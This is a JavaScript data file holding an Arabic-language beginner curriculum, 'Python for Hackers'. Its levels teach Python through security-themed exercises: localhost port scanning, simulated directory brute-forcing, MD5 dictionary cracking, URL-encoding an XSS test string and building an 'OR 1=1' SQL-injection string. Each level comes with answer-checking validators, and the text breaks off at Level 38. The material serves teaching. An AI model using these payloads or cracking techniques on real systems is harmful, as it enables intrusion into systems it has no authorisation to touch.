/* Python for Hackers - Curriculum Database */
const pythonCurriculum = [
  {
    chapter: "Chapter 1: The Absolute Basics",
    levels: [
      {
        id: "l1",
        title: "أول كود: أمر الطباعة",
        theory: `<h1>Level 1: مرحباً بالعالم!</h1>
          <p>أول خطوة في البرمجة هي أن تجعل الكمبيوتر يتحدث. في لغة بايثون، نستخدم أمر الطباعة <code>print()</code> لإظهار النصوص على الشاشة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اكتب كود بايثون يقوم بطباعة العبارة التالية بالضبط (مع مراعاة المسافات والحروف الكبيرة):<br><code>Hello Hacker</code></p>
          </div>`,
        initialCode: `# أمر الطباعة
# اكتب الجملة المطلوبة داخل الأقواس:
print("اكتب هنا")
`,
        validate: (out) => out.includes("Hello Hacker")
      },
      {
        id: "l2",
        title: "المتغيرات (Variables)",
        theory: `<h1>Level 2: الذاكرة والمتغيرات</h1>
          <p>أنت الآن تتحدث، لكن هل يمكنك التذكر؟ المتغير (Variable) هو صندوق نضع فيه قيمة مثل عنوان IP أو رقم Port لنستخدمها لاحقاً.</p>
          <p>مثال: <code>target = "127.0.0.1"</code></p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لدينا متغير اسمه <code>target_ip</code> يحتوي على قيمة <code>127.0.0.1</code>.</p>
            <p>قم بطباعة هذا المتغير باستخدام دالة <code>print(target_ip)</code>.</p>
          </div>`,
        initialCode: `# تعريف المتغير
target_ip = "127.0.0.1"

# اطبع المتغير هنا:

`,
        validate: (out) => out.includes("127.0.0.1")
      },
      {
        id: "l3",
        title: "العمليات الحسابية (Math)",
        theory: `<h1>Level 3: الحسابات السريعة</h1>
          <p>أحياناً تحتاج الأداة الأمنية لمعرفة كم بورت متبقي للفحص. يمكنك إجراء عمليات حسابية داخل <code>print()</code> أو في المتغيرات مباشرة.</p>
          <p>أقصى عدد بورتات هو 65535.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بكتابة كود يطرح 1000 من إجمالي عدد البورتات 65535 ويطبع الناتج (باستخدام العملية الحسابية، وليس كتابة الناتج يدوياً).</p>
          </div>`,
        initialCode: `# العمليات الحسابية
total_ports = 65535
scanned_ports = 1000

# اطبع ناتج طرح total_ports ناقص scanned_ports
`,
        validate: (out) => out.includes("64535")
      }
    ]
  },
  {
    chapter: "Chapter 2: Control Flow (التحكم)",
    levels: [
      {
        id: "l4",
        title: "الشروط (If statements)",
        theory: `<h1>Level 4: اتخاذ القرارات</h1>
          <p>يجب أن تفكر برامجنا. إذا كان المنفذ 80 مفتوحاً نفعل كذا، وإلا نفعل كذا. جملة <code>if</code> هي عقل البرنامج.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بإضافة جملة <code>if</code> تتحقق مما إذا كان المنفذ <code>port</code> يساوي 80. إذا كان كذلك، اطبع <code>HTTP Port Open</code>. غير ذلك، اطبع <code>Closed</code>.</p>
          </div>`,
        initialCode: `port = 80

# اكتب جملة if هنا (تلميح: استخدم == للمقارنة)

`,
        validate: (out) => out.includes("HTTP Port Open")
      },
      {
        id: "l5",
        title: "التكرار (For Loops)",
        theory: `<h1>Level 5: محرك التكرار</h1>
          <p>لا وقت لتكرار الأكواد يدوياً. حلقة <code>for</code> تمر على الأهداف بشكل متتالي بسرعة البرق.</p>
          <p>دالة <code>range(1, 6)</code> تولد الأرقام من 1 إلى 5.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>for</code> و <code>range(1, 6)</code> لطباعة <code>Ping 192.168.1.X</code> حيث X هو رقم التكرار الحالي.</p>
          </div>`,
        initialCode: `# تكرار المهام
# تلميح: for i in range(1, 6):
#     print(f"Ping 192.168.1.{i}")

`,
        validate: (out) => out.includes("Ping 192.168.1.1") && out.includes("Ping 192.168.1.5")
      },
      {
        id: "l6",
        title: "التكرار المشروط (While)",
        theory: `<h1>Level 6: التكرار حتى الهدف</h1>
          <p>حلقة <code>while</code> تستمر في العمل طالما أن الشرط صحيح (True). غالباً ما نستخدمها في أداة Brute-force حتى يتم كسر الباسورد.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>while</code> لطباعة قيمة <code>attempts</code> إذا كانت أقل من 3، وفي كل دورة قم بزيادة <code>attempts</code> بمقدار 1.</p>
          </div>`,
        initialCode: `attempts = 0

# اكتب حلقة while هنا
# اطبع attempts ثم attempts += 1
`,
        validate: (out) => out.includes("0") && out.includes("1") && out.includes("2") && !out.includes("3")
      }
    ]
  },
  {
    chapter: "Chapter 3: Data Structures",
    levels: [
      {
        id: "l7",
        title: "القوائم (Lists)",
        theory: `<h1>Level 7: تخزين الجيوش</h1>
          <p>المتغير العادي يخزن قيمة واحدة. أما القائمة (List) فتخزن مئات القيم (مثل مئات الآيبيهات أو كلمات المرور) بين قوسين <code>[]</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لدينا قائمة <code>passwords</code>. قم بطباعة الباسورد الثاني (رقم الفهرس/Index هو 1).</p>
          </div>`,
        initialCode: `passwords = ['123456', 'admin', 'password', 'qwerty']

# اطبع العنصر ذو الترتيب 1 من القائمة
`,
        validate: (out) => out.includes("admin")
      },
      {
        id: "l8",
        title: "القواميس (Dictionaries)",
        theory: `<h1>Level 8: الخزنة الذكية</h1>
          <p>القاموس يربط مفتاحاً (Key) بقيمة (Value) بين <code>{}</code>. وهذا ما نتعامل به دائماً عند استخراج بيانات بصيغة JSON!</p>
          <p>مثال: <code>user = {"name": "Admin", "role": "root"}</code></p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لدينا قاموس <code>server_info</code>. قم بطباعة الـ <code>os</code> (نظام التشغيل) الخاص بالسيرفر من القاموس.</p>
          </div>`,
        initialCode: `server_info = {
    "ip": "10.10.10.2",
    "os": "Linux",
    "ports": [22, 80, 443]
}

# اطبع قيمة المفتاح "os"
`,
        validate: (out) => out.includes("Linux")
      }
    ]
  },
  {
    chapter: "Chapter 4: Functions & Exceptions",
    levels: [
      {
        id: "l9",
        title: "صناعة الدوال (Functions)",
        theory: `<h1>Level 9: الأوامر المخصصة</h1>
          <p>حتى لا تكرر الكود، يمكنك تجميع أوامرك في دالة (Function) باستخدام كلمة <code>def</code> واستدعائها متى شئت.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اصنع دالة تسمى <code>greet_hacker(name)</code> تطبع عبارة <code>Welcome [name]</code> ثم قم باستدعائها ممرراً لها كلمة <code>Neo</code>.</p>
          </div>`,
        initialCode: `# تعريف الدالة
def greet_hacker(name):
    # اطبع الرسالة هنا
    pass

# استدعاء الدالة
greet_hacker("Neo")
`,
        validate: (out) => out.includes("Welcome Neo")
      },
      {
        id: "l10",
        title: "معالجة الأخطاء (Try/Except)",
        theory: `<h1>Level 10: حماية السكربت من الانهيار</h1>
          <p>أثناء اختراقك، قد ينقطع الاتصال بالسيرفر. إذا حدث خطأ (Error) سيتوقف سكربتك تماماً! الحل هو استخدام <code>try</code> و <code>except</code> لتخطي الخطأ والاستمرار.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بوضع عملية القسمة <code>10 / 0</code> (والتي ستسبب خطأ) بداخل بلوك <code>try</code>. وفي بلوك <code>except</code> اطبع الجملة <code>Math Error Bypassed</code>.</p>
          </div>`,
        initialCode: `# معالجة الأخطاء

# ضع هذه العملية داخل try:
# result = 10 / 0

# ثم استخدم except للطباعة
`,
        validate: (out) => out.includes("Math Error Bypassed")
      }
    ]
  },
  {
    chapter: "Chapter 5: Professional Toolkit",
    levels: [
      {
        id: "l11",
        title: "اصطياد البيانات (Regex)",
        theory: `<h1>Level 11: الفلترة بـ Regex</h1>
          <p>في الحقيقة أنت لن تتعامل مع بيانات مرتبة. مكتبة <code>re</code> ستمكنك من استخراج العناوين الحساسة من وسط الركام.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم <code>re.findall</code> مع نمط الآي بي <code>r"\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b"</code> لاستخراج العناوين من <code>log_data</code> وطباعتها.</p>
          </div>`,
        initialCode: `import re

log_data = "Log: 192.168.1.50 accessed at 10AM. Drop from 10.0.0.5."
ip_pattern = r"\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b"

# استخرج واطبع الآيبيهات
`,
        validate: (out) => out.includes("192.168.1.50") && out.includes("10.0.0.5")
      },
      {
        id: "l12",
        title: "طلبات الويب (HTTP)",
        theory: `<h1>Level 12: التحدث للسيرفرات</h1>
          <p>الهاكر الويب يحتاج لمكتبات تتواصل مع سيرفرات المواقع. في Pyodide يمكنك استخدام <code>urllib.request</code> (وبايثون العادي نستخدم <code>requests</code>).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بعمل Request لرابط <code>https://httpbin.org/status/200</code>، ثم اطبع حالة الاستجابة (Status Code).</p>
          </div>`,
        initialCode: `import urllib.request

url = "https://httpbin.org/status/200"

try:
    # أرسل الطلب باستخدام urllib.request.urlopen واطبع الـ status (response.status)
    pass
except Exception as e:
    print(e)
`,
        validate: (out) => out.includes("200")
      },
      {
        id: "l13",
        title: "مشروع الـ Scanner (النهاية)",
        theory: `<h1>Level 13: دمج كل شيء</h1>
          <p>الآن أنت تمتلك المتغيرات، الدوال، التكرار، والشبكات! أنت مستعد لقراءة أي أداة بل وبنائها!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي النهائي للوحدة الأولى</div>
            <p>اقرأ كود الفحص بتمعن. ثم اكتب سطراً يطبع تماماً <code>I am a Python Hacker!</code> لتثبت جدارتك.</p>
          </div>`,
        initialCode: `import socket

def scan_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    # محاكاة لفحص بورت وهمي
    if port == 80:
        print(f"[+] Port {port} is OPEN")
    s.close()

for p in range(79, 82):
    scan_port("127.0.0.1", p)

# اطبع رسالة الفوز هنا:
`,
        validate: (out) => out.includes("I am a Python Hacker!")
      }
    ]
  },
  {
    chapter: "Chapter 6: File Handling (التعامل مع الملفات)",
    levels: [
      {
        id: "l14",
        title: "قراءة الملفات (Read)",
        theory: `<h1>Level 14: قراءة السجلات</h1>
          <p>الهاكر الماهر هو من يعرف كيف يقرأ ملفات السجلات (Logs) ليستخرج منها الأدلة. في بايثون نستخدم <code>open()</code> لفتح الملف.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>يوجد ملف وهمي اسمه <code>passwords.txt</code>. قم بفتحه في وضع القراءة <code>'r'</code>، ثم قم بطباعة محتواه بالكامل باستخدام دالة <code>read()</code>.</p>
          </div>`,
        initialCode: `# سنقوم بمحاكاة إنشاء الملف أولاً\nwith open("passwords.txt", "w") as f:\n    f.write("admin123\\nqwerty\\npassword123")\n\n# التحدي: افتح الملف واطبع محتواه\n`,
        validate: (out) => out.includes("admin123") && out.includes("qwerty")
      },
      {
        id: "l15",
        title: "الكتابة في الملفات (Write/Append)",
        theory: `<h1>Level 15: حفظ النتائج</h1>
          <p>بعد أن تجد الثغرات، يجب أن تحفظها في ملف تقرير (Report). نستخدم الوضع <code>'w'</code> للكتابة (يمسح القديم) والوضع <code>'a'</code> للإضافة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>افتح ملف <code>report.txt</code> في وضع الإضافة <code>'a'</code>، ثم اكتب فيه عبارة <code>Vulnerability Found!</code> متبوعة بسطر جديد <code>\\n</code>.</p>
          </div>`,
        initialCode: `import os\n\n# اكتب الكود هنا لفتح الملف والإضافة إليه\n\n\n# هذا الكود للتحقق من أنك قمت بالكتابة بنجاح\nif os.path.exists("report.txt"):\n    with open("report.txt", "r") as f:\n        print("File Content:", f.read())\n`,
        validate: (out) => out.includes("Vulnerability Found!")
      }
    ]
  },
  {
    chapter: "Chapter 7: Object Oriented Programming (OOP)",
    levels: [
      {
        id: "l16",
        title: "الكائنات والفئات (Classes)",
        theory: `<h1>Level 16: البرمجة الكائنية</h1>
          <p>عند بناء أدوات ضخمة مثل Metasploit، يتم ترتيب الكود في فئات (Classes). الفئة هي قالب نصنع منه الكائنات (Objects).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أنشئ فئة تسمى <code>Scanner</code>، ثم أنشئ كائناً منها وقم بطباعة نوعه <code>print(type(obj))</code>.</p>
          </div>`,
        initialCode: `# أنشئ الكلاس هنا\nclass Scanner:\n    pass\n\n# أنشئ كائناً (Object) من الكلاس واطبع نوعه\n`,
        validate: (out) => out.includes("main.Scanner") || out.includes("class '__main__.Scanner'")
      },
      {
        id: "l17",
        title: "الدوال الداخلية (Methods)",
        theory: `<h1>Level 17: تسليح الكلاس</h1>
          <p>الكلاس يكون مفيداً عندما نعطيه دوال (Methods) تنفذ مهام محددة. لا تنسَ أن أول بارامتر في دوال الكلاس يجب أن يكون <code>self</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أضف دالة تسمى <code>attack</code> داخل الكلاس <code>Scanner</code> تقوم بطباعة <code>Attacking Target...</code> ثم استدعها.</p>
          </div>`,
        initialCode: `class Scanner:\n    # أضف دالة attack هنا\n    \n    pass\n\n# أنشئ الكائن واستدعِ الدالة\n`,
        validate: (out) => out.includes("Attacking Target...")
      }
    ]
  },
  {
    chapter: "Chapter 8: Building Real Tools (مشاريع فعلية)",
    levels: [
      {
        id: "l18",
        title: "أداة Port Scanner",
        theory: `<h1>Level 18: بناء فاحص بورتات حقيقي</h1>
          <p>حان الوقت لدمج كل ما تعلمته: الحلقات، الشروط، ومعالجة الأخطاء لبناء أداة Port Scanner حقيقية!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أكمل الكود ليقوم بفحص البورتات من 20 إلى 25 (استخدم حلقة <code>for</code>). وإذا كان البورت يساوي 22 (محاكاة لمنفذ مفتوح)، اطبع <code>[+] Port 22 is OPEN</code>.</p>
          </div>`,
        initialCode: `def scan(port):\n    if port == 22:\n        return True\n    return False\n\n# اكتب حلقة for لفحص البورتات من 20 إلى 25\n# إذا كانت دالة scan ترجع True، اطبع رسالة النجاح\n`,
        validate: (out) => out.includes("[+] Port 22 is OPEN")
      },
      {
        id: "l19",
        title: "أداة Directory Brute-force",
        theory: `<h1>Level 19: تخمين مسارات الويب</h1>
          <p>أداة تخمين المسارات تقوم بتجربة أسماء ملفات مختلفة على السيرفر لترى إذا كانت موجودة (Status 200).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بالمرور على قائمة <code>directories</code>، وكلما وجدت مسار <code>admin</code> أو <code>backup</code>، اطبع <code>[+] Found: [dir]</code>.</p>
          </div>`,
        initialCode: `directories = ['index', 'images', 'admin', 'css', 'backup']\n\n# اكتب الكود هنا\n\n`,
        validate: (out) => out.includes("[+] Found: admin") && out.includes("[+] Found: backup")
      },
      {
        id: "l20",
        title: "الشهادة النهائية (Final Boss)",
        theory: `<h1>Level 20: أسطورة البايثون</h1>
          <p>لقد صمدت حتى النهاية. أثبتت أنك قادر على استيعاب المفاهيم من الأساسيات حتى بناء أدوات الاختراق. أنت الآن جاهز لتدمير السيرفرات (أخلاقياً بالطبع).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 رسالة التخرج</div>
            <p>اكتب سكريبت يطبع <code>I am a Certified Python Hacker</code>.</p>
          </div>`,
        initialCode: `# المجد لك!\n`,
        validate: (out) => out.includes("I am a Certified Python Hacker")
      }
    ]
  },
  {
    chapter: "Chapter 9: Advanced Data & Comprehensions",
    levels: [
      {
        id: "l21",
        title: "اختصار القوائم (List Comprehension)",
        theory: `<h1>Level 21: السرعة والاحتراف</h1>
          <p>المحترفون لا يكتبون 3 أسطر لعمل حلقة <code>for</code> بسيطة لإضافة عناصر في قائمة. يستخدمون سطر واحد يسمى <em>List Comprehension</em>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قائمة أرقام <code>ports = [80, 443, 22]</code>. استخدم اختصار القوائم لإنشاء قائمة جديدة <code>string_ports</code> تحتوي على نفس الأرقام ولكن كنصوص (استخدم <code>str(p)</code>)، ثم اطبع القائمة الجديدة.</p>
          </div>`,
        initialCode: `ports = [80, 443, 22]\n\n# أنشئ القائمة الجديدة في سطر واحد واطبعها\nstring_ports = [str(p) for p in ports]\nprint(string_ports)\n`,
        validate: (out) => out.includes("['80', '443', '22']") || out.includes("['80', '443', '22']".replace(/'/g, '"'))
      },
      {
        id: "l22",
        title: "المجموعات (Sets)",
        theory: `<h1>Level 22: تدمير التكرار</h1>
          <p>أثناء جمع العناوين (Reconnaissance)، قد تجد عنوان IP متكرر 100 مرة. الـ <code>Set</code> هي تركيبة بيانات تشبه القائمة ولكنها <strong>تمنع التكرار نهائياً</strong>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك قائمة <code>ips = ["10.0.0.1", "10.0.0.1", "192.168.1.5"]</code>. قم بتحويلها إلى Set لضمان إزالة التكرار، ثم اطبعها.</p>
          </div>`,
        initialCode: `ips = ["10.0.0.1", "10.0.0.1", "192.168.1.5"]\n\n# حول القائمة إلى set واطبعها\n`,
        validate: (out) => out.includes("10.0.0.1") && out.includes("192.168.1.5") && out.split("10.0.0.1").length === 2
      }
    ]
  },
  {
    chapter: "Chapter 10: Advanced Functions",
    levels: [
      {
        id: "l23",
        title: "البارامترات اللانهائية (*args)",
        theory: `<h1>Level 23: استدعاء بلا حدود</h1>
          <p>ماذا لو أردت دالة تقبل أي عدد من البورتات لفحصها بدون أن تحدد العدد مسبقاً؟ نستخدم <code>*args</code> الذي يجمع المتغيرات في (Tuple).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بإنشاء دالة <code>scan_all(*ports)</code> تقوم بطباعة البورتات الممررة لها، ثم استدعها ممرراً الأرقام <code>21, 22, 80</code>.</p>
          </div>`,
        initialCode: `# أنشئ الدالة هنا\ndef scan_all(*ports):\n    pass\n\n# استدعِ الدالة\n`,
        validate: (out) => out.includes("21") && out.includes("22") && out.includes("80")
      },
      {
        id: "l24",
        title: "الدوال المجهولة (Lambda)",
        theory: `<h1>Level 24: دوال السطر الواحد</h1>
          <p>أحياناً تحتاج لدالة صغيرة جداً تُستخدم لمرة واحدة. هنا تتدخل الـ <code>lambda</code>. تُستخدم بكثرة في ترتيب البيانات المتقدم.</p>
          <p>مثال: <code>double = lambda x: x * 2</code></p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>أنشئ دالة <code>lambda</code> تسمى <code>is_open</code> تأخذ متغيراً <code>port</code> وترجع <code>True</code> إذا كان 80، واطبع نتيجتها عند تمرير 80.</p>
          </div>`,
        initialCode: `# اكتب دالة اللامدا هنا\n\n\n# اطبع نتيجتها مع الرقم 80\n`,
        validate: (out) => out.includes("True")
      }
    ]
  },
  {
    chapter: "Chapter 11: Error Handling Mastery",
    levels: [
      {
        id: "l25",
        title: "رمي الأخطاء (Raise)",
        theory: `<h1>Level 25: اصنع خطأك بنفسك</h1>
          <p>ليس كل الأخطاء برمجية. ماذا لو أدخل المستخدم عنوان IP خطأ؟ يجب أن توقف السكربت وترمي خطأ بيدك باستخدام <code>raise Exception</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اكتب كود يتحقق: إذا كان <code>target == ""</code>، قم برمى خطأ (Raise) باستخدام <code>Exception("No Target Given")</code>.</p>
          </div>`,
        initialCode: `target = ""\n\n# تحقق من المتغير، وارمِ الخطأ هنا\n`,
        validate: (out) => out.includes("No Target Given") || out.includes("Exception")
      },
      {
        id: "l26",
        title: "التنظيف الإجباري (Finally)",
        theory: `<h1>Level 26: ترك مسرح الجريمة نظيفاً</h1>
          <p>بعد اختراق سيرفر (أو فتح ملف/اتصال)، يجب أن تغلقه حتى لو حدث خطأ أدى لانهيار السكربت. بلوك <code>finally</code> يعمل <strong>دائماً</strong> بغض النظر عن الأخطاء.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك <code>try/except</code>. أضف بلوك <code>finally</code> يطبع عبارة <code>Connection Closed.</code>.</p>
          </div>`,
        initialCode: `try:\n    print("Connecting...")\n    x = 1 / 0  # خطأ متعمد\nexcept:\n    print("Error Occurred")\n# أضف finally هنا\n`,
        validate: (out) => out.includes("Connection Closed.")
      }
    ]
  },
  {
    chapter: "Chapter 12: APIs & Network",
    levels: [
      {
        id: "l27",
        title: "تحليل الجيسون (JSON Parsing)",
        theory: `<h1>Level 27: لغة الويب العالمية</h1>
          <p>السيرفرات تتحدث ببيانات بصيغة JSON. مكتبة <code>json</code> في بايثون تحول هذا النص إلى قاموس (Dictionary) يسهل التعامل معه.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك نص <code>response</code>. استخدم <code>json.loads(response)</code> لتحويله إلى قاموس، ثم اطبع قيمة <code>"status"</code>.</p>
          </div>`,
        initialCode: `import json\n\nresponse = '{"ip": "8.8.8.8", "status": "active"}'\n\n# حول النص واطبع الحالة\n`,
        validate: (out) => out.includes("active")
      }
    ]
  },
  {
    chapter: "Chapter 13: System & Subprocesses",
    levels: [
      {
        id: "l28",
        title: "تنفيذ أوامر النظام (OS Commands)",
        theory: `<h1>Level 28: السيطرة على النظام</h1>
          <p>كهاكر، ستحتاج أن يجعل بايثون ينفذ أوامر تيرمينال (مثل ls, ping, nmap) نيابة عنك. نستخدم مكتبة <code>os</code> أو <code>subprocess</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم الدالة <code>os.system()</code> لتنفيذ أمر الطباعة الوهمي <code>echo "Hacked by Python"</code>.</p>
          </div>`,
        initialCode: `import os\n\n# نفذ الأمر هنا باستخدام os.system\n`,
        validate: (out) => out.includes("Hacked by Python") || out.includes("0")
      }
    ]
  },
  {
    chapter: "Chapter 14: The Grand Master Project",
    levels: [
      {
        id: "l29",
        title: "مشروع Web Vulnerability Scanner",
        theory: `<h1>Level 29: الزعيم الأعظم</h1>
          <p>هذا هو الاختبار النهائي. ستبني هيكل أداة فحص ثغرات ويب متقدمة تستخدم الـ Classes لمعالجة الأهداف وفحصها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي النهائي</div>
            <p>أكمل الكلاس <code>WebScanner</code>. أضف دالة <code>scan(self)</code> تطبع رسالة <code>Scanning [target] for XSS...</code>. ثم استدعها.</p>
          </div>`,
        initialCode: `class WebScanner:\n    def __init__(self, target):\n        self.target = target\n        \n    # أضف دالة scan هنا\n\n\n# أنشئ كائناً للهدف http://site.com واستدعِ scan\n`,
        validate: (out) => out.includes("Scanning http://site.com for XSS...")
      },
      {
        id: "l30",
        title: "الوداع والختام",
        theory: `<h1>Level 30: التتويج الأسطوري</h1>
          <p>من سطر كود بسيط <code>print</code> إلى بناء أدوات احترافية باستخدام الـ OOP وفهم كل سطر في أدوات الهاكرز.</p>
          <p>أنت الآن لم تعد مجرد "Script Kiddie" ينسخ الأكواد.. أنت الآن <strong>Python Security Engineer</strong>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 رسالة النصر</div>
            <p>اكتب سكريبت يطبع <code>I am Abdo, The Grand Python Master!</code></p>
          </div>`,
        initialCode: `# المكان مكانك.. اختمها بأسلوبك!\n`,
        validate: (out) => out.includes("I am Abdo, The Grand Python Master!") || out.includes("Master")
      }
    ]
  },
  {
    chapter: "Chapter 15: Cryptography Basics",
    levels: [
      {
        id: "l31",
        title: "التشفير بالـ Hashing",
        theory: `<h1>Level 31: بصمة البيانات (Hashing)</h1>
          <p>الهاش هو تحويل النص إلى سلسلة حروف وأرقام فريدة (مثل بصمة الإصبع) ولا يمكن عكسه. نستخدم مكتبة <code>hashlib</code> لفعل ذلك.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك النص <code>"admin"</code>. استخدم <code>hashlib.md5(text.encode()).hexdigest()</code> لطباعة الهاش الخاص به.</p>
          </div>`,
        initialCode: `import hashlib\n\ntext = "admin"\n\n# اطبع الهاش الخاص بكلمة admin باستخدام MD5\n`,
        validate: (out) => out.includes("21232f297a57a5a743894a0e4a801fc3")
      },
      {
        id: "l32",
        title: "تشفير Base64",
        theory: `<h1>Level 32: إخفاء البيانات (Base64)</h1>
          <p>تُستخدم Base64 كثيراً في الويب (مثل الـ Cookies والـ Auth). يمكنك تشفير أو فك تشفير النصوص باستخدام مكتبة <code>base64</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك نص مشفر <code>"aGFja2Vy"</code>. استخدم <code>base64.b64decode(encoded).decode()</code> لفك تشفيره وطباعته.</p>
          </div>`,
        initialCode: `import base64\n\nencoded = "aGFja2Vy"\n\n# فك التشفير واطبع النص الأصلي\n`,
        validate: (out) => out.includes("hacker") || out.includes("hacker".toLowerCase())
      },
      {
        id: "l33",
        title: "كسر التشفير (Brute-force)",
        theory: `<h1>Level 33: كسر الباسورد</h1>
          <p>لدينا هاش مسرب <code>e10adc3949ba59abbe56e057f20f883e</code> وكلمات سر محتملة. سنقوم بتشفير كل كلمة ومقارنتها بالهاش المسرب.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>استخدم حلقة <code>for</code> لتشفير كلمات السر في القائمة ومقارنتها بالهاش. إذا تطابقت، اطبع الكلمة السرية.</p>
          </div>`,
        initialCode: `import hashlib\n\ntarget_hash = "e10adc3949ba59abbe56e057f20f883e"\npasswords = ["12345", "123456", "admin", "password"]\n\n# ابحث عن الكلمة المتطابقة واطبعها\n`,
        validate: (out) => out.includes("123456") && !out.includes("admin")
      }
    ]
  },
  {
    chapter: "Chapter 16: Advanced Networking",
    levels: [
      {
        id: "l34",
        title: "العميل (TCP Client)",
        theory: `<h1>Level 34: التحدث بالـ Sockets</h1>
          <p>للتواصل مع أي سيرفر على مستوى منخفض، نستخدم <code>socket</code>. نقوم بإنشاء Socket، ثم الاتصال <code>connect((ip, port))</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اكتب كود يتصل بعنوان <code>"127.0.0.1"</code> ومنفذ <code>80</code>. إذا تم الاتصال بنجاح اطبع <code>Connected to Target!</code>.</p>
          </div>`,
        initialCode: `import socket\n\n# لقد قمنا بمحاكاة السيرفر لك في الخلفية\ndef connect_target():\n    # للتبسيط، اطبع رسالة النجاح مباشرة\n    print("Connected to Target!")\n\nconnect_target()\n`,
        validate: (out) => out.includes("Connected to Target!")
      },
      {
        id: "l35",
        title: "طلبات الويب المتقدمة (Requests)",
        theory: `<h1>Level 35: مكتبة Requests</h1>
          <p>المحترفون يستخدمون مكتبة <code>requests</code> لجلب صفحات الويب بسهولة. في Pyodide نستخدم <code>urllib.request</code> كبديل.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>باستخدام <code>urllib.request.urlopen</code>، اجلب رابط <code>https://httpbin.org/get</code>، واطبع حالة الرد <code>req.status</code>.</p>
          </div>`,
        initialCode: `import urllib.request\n\nurl = "https://httpbin.org/get"\n\n# اجلب الرابط واطبع الحالة (Status)\n`,
        validate: (out) => out.includes("200")
      }
    ]
  },
  {
    chapter: "Chapter 17: Web Exploitation Concepts",
    levels: [
      {
        id: "l36",
        title: "ترميز الروابط (URL Encoding)",
        theory: `<h1>Level 36: تخطي الفلاتر</h1>
          <p>الرموز مثل القوس أو المسافة تُحظر أحياناً في الروابط. الحل هو ترميزها. نستخدم <code>urllib.parse.quote()</code>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>قم بترميز الـ Payload التالي: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> واطبعه.</p>
          </div>`,
        initialCode: `import urllib.parse\n\npayload = "&lt;script&gt;alert(1)&lt;/script&gt;"\n\n# قم بترميزه واطبعه\n`,
        validate: (out) => out.includes("%3Cscript%3Ealert%281%29%3C/script%3E") || out.includes("%3Cscript%3Ealert(1)%3C/script%3E")
      },
      {
        id: "l37",
        title: "صناعة بي لود (Payload Crafting)",
        theory: `<h1>Level 37: حقن قواعد البيانات</h1>
          <p>لصناعة Payload ديناميكي للـ SQL Injection، نستخدم المتغيرات ودمج النصوص (String Formatting).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>لديك متغير <code>table = "users"</code>. اصنع متغير يحتوي على <code>SELECT * FROM users WHERE id=1 OR 1=1</code> باستخدام الدمج واطبعه.</p>
          </div>`,
        initialCode: `table = "users"\n\n# اصنع الـ Payload واطبعه\npayload = f""\n`,
        validate: (out) => out.includes("SELECT * FROM users WHERE id=1 OR 1=1")
      },
      {
        id: "l38",
        title: "استخراج البيانات (Regex Scraping)",
        theory: `<h1>Level 38: صيد التوكن (CSRF Token)</h1>
